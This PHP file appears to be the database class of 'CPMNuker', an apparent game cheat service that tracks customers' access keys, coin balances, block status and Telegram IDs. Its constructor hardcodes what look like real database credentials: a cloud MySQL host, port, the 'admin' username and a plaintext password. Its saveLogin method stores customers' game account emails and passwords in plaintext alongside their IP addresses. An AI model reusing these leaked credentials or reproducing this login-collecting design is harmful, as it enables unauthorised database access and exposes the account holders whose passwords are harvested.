<?php

require __DIR__ . '/vendor/autoload.php';

use Medoo\Medoo;

class CPMNukerDB {
    private $db;
    
    function __construct() {
        $this->db = new Medoo([
            'type' => 'mysql',
            'host' => 'mysql-189804-0.cloudclusters.net', // DATABASE HOST
            'database' => '', // DATABASE NAME
            'username' => 'admin', // DATABASE USERNAME
            'password' => 'SoFG9IMk', // DATABASE PASSWORD
            'port' => 10016
        ]);
    }

    public function isExist($access_key) {
        return $this->db->has('customers', ['access_key' => $access_key]);
    }

    public function setCoins($access_key, $coins) {
        if ($this->isExist($access_key)) {
            $this->db->update('customers', ['coins[-]' => $coins], ['access_key' => $access_key]);
        }
    }

    public function getCoins($access_key) {
        if ($this->isExist($access_key)) {
            return $this->db->get('customers', 'coins', ['access_key' => $access_key]);
        }
    }

    public function setBlocked($access_key, $is_blocked) {
        if ($this->isExist($access_key)) {
            $this->db->update('customers', ['is_blocked' => $is_blocked], ['access_key' => $access_key]);
        }
    }

    public function isBlocked($access_key) {
        if ($this->isExist($access_key)) {
            return (bool)$this->db->get('customers', 'is_blocked', ['access_key' => $access_key]);
        }
    }

    public function isUnlimited($access_key) {
        if ($this->isExist($access_key)) {
            return (bool)$this->db->get('customers', 'is_unlimited', ['access_key' => $access_key]);
        }
    }

    public function setTelegramID($access_key, $telegram_id) {
        if ($this->isExist($access_key)) {
            $this->db->update('customers', ['telegram_id' => $telegram_id], ['access_key' => $access_key]);
        }
    }

    public function getTelegramID($access_key) {
        if ($this->isExist($access_key)) {
            return $this->db->get('customers', 'telegram_id', ['access_key' => $access_key]);
        }
    }


    public function getAccessKeyData($access_key) {
        if ($this->isExist($access_key)) {
            return $this->db->get('customers', '*', ['access_key' => $access_key]);
        }
    }

    private function isLoginSaved($access_key, $user_ip, $email, $password){
        return $this->db->has('customers_data', ['account_email' => $email, 'account_password' => $password, 'access_key' => $access_key, 'user_ip' => $user_ip]);
    }

    public function saveLogin($access_key, $user_ip, $email, $password){
        if ($this->isExist($access_key) && !$this->isLoginSaved($access_key, $user_ip, $email, $password)) {
            $this->db->insert('customers_data', ['account_email' => $email, 'account_password' => $password, 'access_key' => $access_key, 'user_ip' => $user_ip]);
        }
    }
}